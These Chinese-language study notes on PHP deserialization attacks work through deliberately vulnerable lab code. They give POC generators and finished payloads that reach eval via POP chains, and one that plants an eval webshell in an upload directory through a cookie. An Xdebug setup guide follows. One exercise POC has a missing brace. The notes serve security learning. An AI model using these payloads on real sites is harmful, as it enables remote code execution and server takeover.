# php反序列化

序列化其实就是将数据转化成一种可逆的数据结构，逆向的过程就叫做反序列化。

php 将数据序列化和反序列化会用到两个函数

**serialize** 将对象格式化成有序的字符串

**unserialize** 将字符串还原成原来的对象

序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。



## php中的魔术方法

~~~
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__construct() //实例初始化时被调用
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发

~~~



<a>[PHP: 魔术方法 - Manual](https://www.php.net/manual/zh/language.oop5.magic.php)</a>



## 知识点



反序列化构造成功，类变量的值，可以通过反序列化的字符串传进去。



没有实例化的变量进行序列化和反序列化时，也会自动调用那几个魔术方法，这是因为啥？因为序列化的那段字符串中表明了是people类。



修改了序列化的字符串中的内容以后，记得修改字符数量。



重要：

new一个新的类实例的时候，会调用`__construct（）`，然后调用`__destruct()`；

如果调用了unserialize（）进行反序列化的时候，最后还会调用`__destruct()`;

其中的顺序为：

~~~
先调用new-----调用__construct-----其中有方法调用了unserilize----调用destruct,这时调用destruct用到的参数为序列化字符串传入的参数（类属性的值）-----处理完之后还会调用一次destruct，这时序列化字符串中的参数（类实例的值）不再传入，而是为默认值。
~~~



重要：`https://www.cnblogs.com/fish-pompom/p/11126473.html`

请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：

(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在

这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。

(2)我们在反序列化攻击的时候也就是依托类属性进行攻击

因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击



反序列化中的可控点是那些，类属性属于可控点，凡是被定义为类属性的点，都可以称为是可控点。因为做反序列化的字符串可控，传递到服务器的参数（类属性的值）也就是可控的。-------凡是参数为类属性，那都是可控点。



php中的访问修饰符

public 正常序列化

protected`%00`*`%00`变量名

private`%00`变量名`%00`

在复制payload时要注意手动输入`%00`		//高级注意点

或者直接进行url编码。



输出点去找eval这种函数，真实情况eval存在的概率较低，一般是使用：

~~~
call_user_func（）	//用于调用用户定义的函数
call_user_func('nowamagic', "111","222"); 	//nowamagic为函数名，111和222为函数的参数
call_user_func(array("a","b"),"111");	//调用a（类）中的b（类方法），且参数为111

call_user_func_array()	//作用相同
call_user_func_array(array('ClassA','bc'), array("111", "222"));//调用classA（类）中的bc（类方法），参数为111和222
~~~



1、serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。

2、unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。

3、魔术方法：PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。

4、serialize()和unserialize()函数对魔术方法的处理：serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作，此功能可以用于清理对象。
unserialize()函数会检查类中是否存在一个魔术方法__wakeup()，如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

5、__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。



反序列化unserialize（）调用以后，一定会被调用的函数。先调用__wakeup()，后调用`__destruct()`,



## 实验

### 实验一

目标源码

~~~
<?php
class Woniu {
    var $a;
    function __construct() {
        $this->a = new Test();
    }
    function __destruct() {
        $this->a->hello();
    }
}
class Test {
    function hello() {
        echo "Hello Word.";
    }
}
class Vul {
    public $data;
    function hello() {
        @eval($this->data);
    }
}
unserialize($_POST['code']);
?>
~~~

进行反序列化时，会调用destruct（）-------

destruct（）最终调用hello（）-------

hello（）有两个，一个是test中的（无利用点），一个是vul中的（有执行函数eval，且eval参数为类属性（可控））--------

调用哪个函数中的hello由woniu中的类属性a决定，因为a是类属性（可控）--------

__construct()被调用的话，a会被赋值为test，现在需要a的值为val，所以不能调用`__construct`------

直接通过反序列化的字符串传入类属性的值，a:val。



payload生成：

生成payload的过程，就是因为这串序列化的字符串很难直接构造出来（写的过程中有很多符号，出错很多），所以先用这段代码生成自己想要的序列化字符串。

其中有些不需要的代码可以省略掉，比如哪些没有类属性的，没有方法调用的，不能作为调用链跳板的。

调用的方法不是为了给属性赋值，全都可以省略掉（在简化payload的时候）

需要类属性的值为什么，可以直接为类属性赋值

~~~
<?php
class Woniu {
    var $a;
    function __construct() {
        $this->a = new Vul();
        //$this->a->hello();
    }
}
class Vul {
    public $data = "phpinfo();";
//   function hello() {
//        @eval($this->data);
//    }
}
echo serialize(new Woniu());
?>
~~~

生成的payload为：

~~~
O:5:"Woniu":1:{s:1:"a";O:3:"Vul":1:{s:4:"data";s:10:"phpinfo();";}}
~~~



访问源码，POST传入参数：

~~~
code=O:5:"Woniu":1:{s:1:"a";O:3:"Vul":1:{s:4:"data";s:10:"phpinfo();";}}
~~~

phpinfo（）成功执行，反序列化成功。



修改php的访问修饰符

~~~
// var $a;
private $a;
// public $data;
protected $data;
~~~

使用private，protected来修饰类属性，类从全局变为了私有类和私有继承类。

再次进行反序列化，失败。

重新生成修改后的payload：

~~~
O:5:"Woniu":1:{s:8:"Woniua";O:3:"Vul":1:{s:7:"*data";s:10:"phpinfo();";}}
~~~

再次尝试反序列化，失败。

因为序列化后的字符串会在private，protected后面，变量名两侧添加%00，隐藏字符复制不了。

解决方法为生成payload时进行url编码：

~~~
echo urlencode(serialize(new Woniu()));
~~~

将生成的payload作为参数传入源码中：
~~~
code=O%3A5%3A%22Woniu%22%3A1%3A%7Bs%3A8%3A%22%00Woniu%00a%22%3BO%3A3%3A%22Vul%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
~~~

phpinfo（）执行成功，反序列化成功过。



### 实验二

目标源码：

~~~
<?php
class Template {
    var $cacheFile = "cache.txt";
    var $template = "<div>Welcome come %s</div>";
    function __construct($data = null) {
        $data = $this->loadData($data);
        $this->rander($data);
    }
    function loadData($data) {
        return unserialize($data);
        return [];
    }
    function createCache($file = null, $tpl = null) {
        $file = $file ?: $this->cacheFile;
        $tpl = $tpl ?: $this->template;
        file_put_contents($file,$tpl);
    }    
    function rander($data) {
        echo sprintf($this->template, htmlspecialchars($data['name']));
    }
    function __destruct() {
        $this->createCache();
    }
}
new Template($_COOKIE['data']);
?>
~~~

漏洞分析

输出点再file_put_contents()，可以写入木马；

调用链为 ：

~~~
new Template（）------__construct（）------loadData（）-----unserialize（）-----这里代码正常继续往下执行，也就是rander（），但是在调用链中，unserialize执行完会调用destruct ------createCache（）-----file_put_contents。
正常代码执行，在最后代码执行完，释放存储空间时才会调用__destruct()。
~~~

需要传入的参数为`$cacheFile`和`$template`，木马写入到uplaod目录下（有写权限），值为`"../upload/shell7.php"`

参数`$template`为文件写入的内容，值为：`'<?php eval($_POST["code"])?>'`

由于__destruct()是最后执行的，在他们之前会执行rander（），也就是会执行：

~~~
echo sprintf($this->template, htmlspecialchars($data['name']));	//把格式化的字符串写入一个变量中。
~~~

其中进行了反序列化的对象应当为一个数组，因为代码通过`$data['name']`来取值，如果$data不是数组的话，会直接致命错误，所以需要将$data转化为数组，哪怕其中没有name的值也没关系（报错但不会停止代码的运行）

最终生成的生成POC为：

~~~
<?php


class Template {
    var $cacheFile = "../upload/shell7.php";
    var $template = '<?php eval($_POST["code"])?>';
    
    function __construct($file = null, $tpl = null) {	//其实这段方法也可以去掉，生成序列化的字符串（payload），只需														   //要关注其中类属性的赋值，哪里有类的声明，赋值。
        $file = $file ?: $this->cacheFile;
        $tpl = $tpl ?: $this->template;
    } 
}
$t = serialize(array(new Template()));
echo urlencode($t);
?>
~~~

执行代码，生成payload：

~~~
a%3A1%3A%7Bi%3A0%3BO%3A8%3A%22Template%22%3A2%3A%7Bs%3A9%3A%22cacheFile%22%3Bs%3A20%3A%22..%2Fupload%2Fshell7.php%22%3Bs%3A8%3A%22template%22%3Bs%3A28%3A%22%3C%3Fphp%20eval%28%24_POST%5B%22code%22%5D%29%3F%3E%22%3B%7D%7D
~~~

访问demo3，在cookie参数中添加参数data=payload。

查看文件，shell成功写入，反序列化漏洞利用成功。

在实验二中遇到的离谱问题（都已经解决）：

~~~
生成的payload只能用一次，即反序列化字符串用完，生成文件以后，删除文件，再次执行，文件不会再生成，重新生成一段payload（和之前的payload一样），复制粘贴，重新执行，shell生成。
不重新生成payload，代码只执行一次destruct，执行的cat，没有写入shell

重新生成payload，代码只执行一次destruct，执行的cat，写入了shell，（没道理）
怀疑是有缓存。不对
因为执行的是demo4（poc）那段代码中写入的文件。也就执行demo4写入shell，执行demo3写入cat。效果和正常一样，但过程完全不同。
现在的问题是 demo3的代码执行不正常，也就是调用完unserialize之后，不自动调用__destruct。其中的代码不执行。
是因为传参传错了，应该是data，写成code了
因为没有参数传进来，所以unserialize执行时，空不会请求存储空间，所以也不会释放存储空间，所以调用不到__destruct()。

调用完unserialize（）之后，不会立刻调用__destruct()，而是等代码都执行完之后再执行（释放空间）。

因为进行了url编码，原本的空格被变为了+，这样写入shell中的内容为php+eval。可以通过手动修改payload，将+改为%20，这样就正常写入php eval了。
~~~



### 实验三

目标源码：

~~~
<?php
class Tiger{
    public $string;
    protected $var;
    public function __toString(){
        return $this->string;
    }
    public function boss($value){
        @eval($value);
    }
    public function __invoke(){
        $this->boss($this->var);
    }
}
class Lion{
    public $tail;
    public function __construct(){
        $this->tail = array();
    }
    public function __get($value){
        $function = $this->tail;
        return $function();
    }
}
class Monkey{
    public $head;
    public $hand;
    public function __construct($here="Zoo"){
        $this->head = $here;
        echo "Welcome to ".$this->head."<br>";
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->head)) {
            echo "hacker";
            $this->source = "index.php";    // 通过这条触发__get()，往下走进行尝试。
        }
    }
}
class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice"){
        $this->nice = $nice;
        echo $nice;
    }
    public function __toString(){
        return $this->nice->nose;
    }
}
if(isset($_GET['zoo'])){
    @unserialize($_GET['zoo']);
}
else{
    $a = new Monkey;
    echo "Hello!";
}
?>
~~~

漏洞分析：

终点为tiger类中的boss方法。起点为monkey中的wakeup方法。

进行反推，调用链为：

~~~
tiger（boss）---tiger（__invoke）-----lion（__get）-----elephant（__tostring）----monkey(__wakeup)----unserialize()
~~~

构造poc（pop链，面向属性编程）：

将上面反推的过程翻过来，也就是正推。

`monkey（__wakeup）`为出发点，$this->head的值为类实例的时候，可以触发到`__tostring`,且要触发到elephant的`__tostring`,所以赋值$this->head=new elephant()。
进入到elephant类中，下一步希望触发lion的（`__get`）,所以赋值$this->nice=new lion()。
进入到lion类中，下一步希望触发tiger（`__invoke`），所以赋值$this ->tail=new tiger()。
进入到tiger类中，需要在类中触发到boss方法，进入invike后自动调用。
pop链编写完毕，其中只对属性进行了赋值，没有详细写过程，因为这是反推时需要做的，当反推出一条可用的调用链时，需要做的就是对属性赋值，在多个类中间进行跳转，触发魔术方法的值应该是下一步的类，因为这样才能让代码跳转到下一个类中，调用到的才是这个类中的魔术方法，（正常的达成了触发魔术方法的条件，它只会在当前类中寻找触发了的魔术方法，想要触发别的类中的魔术方法，就应该将属性的值定义为其他类的实例，这样才能在不同的类中进行跳转）。

~~~
<?php

class Tiger{
    protected $var = 'phpinfo();';
}
class Lion{
    public $tail;
    public function __construct(){
        $this->tail = new Tiger();
    }
}

class Monkey{
    public $head;
    public function __construct($here="Zoo"){
        $this->head = new Elephant();
    }
}

class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice"){
        $this->nice = new Lion();
    }
}
echo urlencode(serialize(new Monkey()));
?>
~~~

实验三中的离谱问题：

~~~
代码复杂的情况：
调试模式，整明白代码逻辑，写POC生成payload，
但是调试模式需要一个序列化的字符串（不是payload，至少得让代码运行起来），没有这段字符串，就没办法让代码正常的运行起来（一些序列化的函数调用不到），代码运行不起来，我就整不懂代码逻辑，整不懂逻辑就生成不了这段字符串。
~~~



### 练习

1.目标源码：

~~~
<?php

class Modifier {
    protected  $var;
    public function append($value){
        eval($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='demo3.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "demo3.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
?>
~~~

这里的`__wakeup()`是因为$source的值是类实例，不是字符串，if条件不满足，所以没有执行其中赋值的代码。

这里注意，声明变量时，如果变量是public类的，可以不用写，如果是protected，private类的，必须要在poc中声明出来（如下面第三行代码那样）。

poc生成：

~~~
<?php

class Modifier {
    protected  $var;
    public function __construct() {
        $this->var = 'phpinfo();';
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='demo3.php'){
        $this->source = $file;
        $this->str = new Test();
}

class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}
$b = new Show();
// $b->str = new Test();
echo urlencode(serialize(new Show($b)));
?>
~~~



问题：

1 //重要

为啥在`__wakeup()`中对属性（类变量）进行重新赋值需要想办法绕过，而在`__construct()`中对属性（类变量）重新赋值不需要绕过；在类下直接进行赋值也不需要绕过，直接通过序列化的字符串传入即可，没有被覆盖掉。



2//重要

想要调用当前类中的`__tostring()`，应该为属性（也就是被当作字符串的类）赋值为什么。如果是定义为其他的类，会跳转到其他类中寻找`__tostring()`,如果定义为当前类，则会一直循环，代码如法执行。

~~~
class Show{
    public $source;
    public $str;
    public function __construct($file='demo3.php'){
        $this->source = ;			//也就是这个source应该是什么。
        $this->str = new Test();
        echo 'Welcome to '.$this->source."<br>";
~~~

解决方法：

~~~
$b = new Show();
$b->str = new Test();
echo urlencode(serialize(new Show($b)));
~~~

既然需要`$source`为一个类，且不能是别的类或类实例，必须是当前类的实例，这样才能触发当前类中的魔术方法。

所以也就是$this->source应该等于new Show()，但是这样写会导致代码一直循环，走不出去。

所以这里在类外定义参数，形式大约是new show（new show（）），这样将一个类实例传递给代码中，用于触发`__tostring()`，而且因为这个类是当前的类，触发的魔术方法也是当前类中的。但这样写也会报错，所以写成上述的样子。

至于`$b->str = new Test()`为啥写在类外面，而不是写在`__construct()`中，这是因为new show（new show（））这种形式会触发两次`__construct()`,如果写在类中，`$b->str = new Test()`也会执行两次，不过执行两次也没关系，生成的payload都是可用的。



2.目标源码：

~~~
<?php
error_reporting(0);

class A {
    protected $store;
    protected $key;
    protected $expire;
    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }
    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);
        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }
        return $contents;
    }
    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);
        return json_encode([$cleaned, $this->complete]);
    }
    public function save() {
        $contents = $this->getForStorage();
        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('?');
        }
        return $cache_filename;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }
        $data = $this->serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            return $filename;
        }
        return null;
    }
}
if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}
$dir = "uploads/";
if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);

~~~

解决问题：

php代码中的exit如何绕过。

php://filter绕开，

php伪协议。

~~~
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
~~~

[【精选】PHP伪协议详解-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120695429)





## XDebug安装

1、解压源码，进入xdebug文件主目录

2、执行文件 /opt/lampp/bin/phpize （php，apache所在文件位置）

3、执行报错，安装autoconf，yum install autoconf

4、

~~~
./configure--enable-xdebug --with-php-config=/opt/lampp/bin/php-config
~~~

5、输入make

6、输入make Install

7、取得扩展文件xdebug.so的路径

~~~
installing shared extension:
~~~

8、修改：/opt/lampp/etc/php.ini，在Module Settings节点下添加：

~~~
[XDebug]
zend_extension=/opt/lampp/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so
xdebug.remote_enable = 1        ;开启远程调试功能
xdebug.remote_autostart = 1     ;自动启动
xdebug.remote_handler = "dbgp"  ;调试处理器
xdebug.remote_port = "9000"     ;端口号
xdebug.remote_host = "192.168.1.111"    ;远程调试的ip地址，即php所在地址
~~~

9、访问phpinfo（），如果有xdebug模块说明安装成功，如果没有，尝试重启php。

10、linux主机上的配置完成，进行vscode上的配置。

修改configurations中的port端口为9000（和上面linux上的配置保持一致）

11、设置断点，进行访问，如果程序运行到断点正常停止，即xdebug安装成功。









## 注意：

1.调用类属性如

~~~
class test{
	public $a = "";
	var $b = "";
}

$t = new test();
$t->a = '123';
$t->b = '23'
~~~

实例化的类中调用a不需要写成$a。



2.类中的this

指代当前类的实例

$this是一个用来表示类内部的属性和方法的代号,相当于类本身。作用范围在类的内部。

比如 $user = new User();

$this 就相当于$user;

至于里面的参数，那是类初始化的时候，给它的一个属性的赋初始值。

继承一个类的话，子类会默认覆盖父类的__construct方法



3.类属性写入不能只写$a，需要使用public，var声明。

public是定义property(属性)和method(方法)的可见性的关键字，用public修饰的属性和方法在类的内部和外部都可以访问。var是定义变量的。用var定义的变量如果没有加protected 或 private则默认为public。在php4中类中用var定义的变量必须在定义时或在类的构造函数中进行初始化。